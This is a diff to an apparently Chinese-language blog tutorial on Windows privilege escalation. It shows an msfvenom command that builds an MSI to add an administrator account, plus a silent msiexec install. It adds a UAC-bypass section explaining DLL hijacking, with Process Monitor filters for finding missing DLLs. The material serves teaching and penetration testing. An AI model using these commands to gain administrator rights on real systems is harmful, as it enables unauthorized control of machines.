@@ -345,7 +345,14 @@
 <figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">msfvenom -p windows/adduser <span class="attr">USER=superadmin</span> <span class="attr">PASS=supersuper</span> -f msi -o supper.msi</div></pre></td></tr></table></figure>
 <p>通过在普通用户下执行该msi，可生成Administrator权限用户<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">msiexec <span class="regexp">/quiet /qn /i</span> <span class="keyword">super</span>.msi</div></pre></td></tr></table></figure></p>
 <p>在实际利用过程中，该注册表项默认为0或不存在，因此较为鸡肋</p>
-<p>## </p>
+<h2 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h2><blockquote>
+<p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>
+</blockquote>
+<p>首先安装对应版本的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="external">ProcessMonitor</a><br>运行ProcessMonitor，打开某需要UAC认证的程序，通过filter过滤出进程的DLL文件访问情况</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Process <span class="keyword">Name</span> <span class="keyword">is</span> install.exe</div></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Path <span class="keyword">contains</span> localdir</div></pre></td></tr></table></figure>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Result <span class="keyword">is</span> <span class="keyword">NAME</span> <span class="keyword">NOT</span> FOUND</div></pre></td></tr></table></figure>
+<p>以上三个filter，可以发现程序中尝试在本地加载但是本地不存在的dll，通过在同级目录生成对应的dll文件，即可劫持。</p>
 
           
         
